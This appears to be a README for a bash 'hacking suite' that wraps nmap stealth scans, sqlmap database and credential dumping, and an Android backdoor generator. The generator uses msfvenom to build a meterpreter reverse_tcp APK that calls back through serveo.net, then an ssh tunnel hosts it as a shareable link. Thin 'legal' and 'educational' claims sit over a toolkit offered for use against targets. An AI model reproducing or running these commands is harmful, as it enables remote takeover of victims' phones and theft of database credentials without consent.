# 🧠 What Is aaayafuj_hacking_tools_neter.sh?
`A bash-based hacking suite that automates setup, reconnaissance, exploitation, payload generation, and ethical research workflows — all under the legally structured aaayafuj framework.`

* [1] It's designed to:
* [2] Auto-install everything
* [3] Give you one place to run your recon, SQLi, payload gen, etc.
* [4] Connect to Net AAA (secure comm)
* [5] Link you to aaayafuj Marketplace
* [6] Work on Kali, Ubuntu, or any Debian-based distro
* [7] Act like a launcher + manager + secure entry point

[#]🚩 Tools Included & Their Purpose
# 1. Nmap Recon
    nmap -sS -A -T4 $target
* (.) Full stealth scan (-sS)
* (.) OS and version detection (-A)
* (.) Timing level 4 for fast scan
* (.) Used to find open ports, detect services, and map a target network
* (.) Why? Because every op starts with knowing your battlefield.

# 2. SQLMap Injection Toolkit
    sqlmap -u "$url" --dbs
* (+)= Automatically detects and exploits SQL injection vulnerabilities.
* (+)= Dumps databases, tables, or even full creds.
* (+)= Why? Web vulnerabilities are low-hanging fruit. SQLMap makes it legal and fast.

# 3. Payload Link Generator (Serveo + msfvenom)
    msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=4444 -o payload.apk
    ssh -R 80:localhost:4444 serveo.net
    Generates Android backdoors

[1] Hosts them online using serveo.net tunnels
[2] Auto-creates shareable links
[3] Why? For legal red team testing or educational sandboxing.

# 4. Net AAA Terminal Shortcut
    xdg-open https://net-aaa.aaayafuj.com
* Opens the official secure terminal chat for aaayafuj users.
* Used for secure intel sharing, coordination, and AI-based discussions.

# 5. aaayafuj Marketplace Access
    xdg-open https://marketplace.aaayafuj.com
* Opens the online shop for tools, licenses, books, and restricted utilities.
* [OR]
* Secure identity & certification checks included.

# 6. System Installer (Full Automation)
    apt update && apt install nmap sqlmap metasploit-framework openssh curl wget git -y
* Ensures everything needed is on your system
* Even fetches GitHub tools you need

7. Menu Interface (Old School Cool)
* select option in Nmap SQLMap Payload NetAAA Exit; do
   # case $option in ...
* Runs from terminal
* Styled with ASCII banners
* Easy option select, great for demos or fast ops

# 8. Logging + Banner Engine
    echo -e "\e[1;91m██╗  ██╗███████╗ █████╗ ██╗   
                     ██╗ █████╗ ███████╗██╗   ██╗\e[0m"
                     AAA         YAFUJ        AYFJ
* Displays your custom aaayafuj ASCII banner at startup
* Logs actions to /var/log/aaayafuj.log or custom path

✅ Full Workflow Example:
bash
Copy
Edit
./aaayafuj_hacking_tools_neter.sh

# Choose:
1. Recon with Nmap
2. Inject with SQLMap
3. Generate Android payload and share link
4. Open NetAAA secure terminal
5. Shop legal tools in the aaayafuj Marketplace
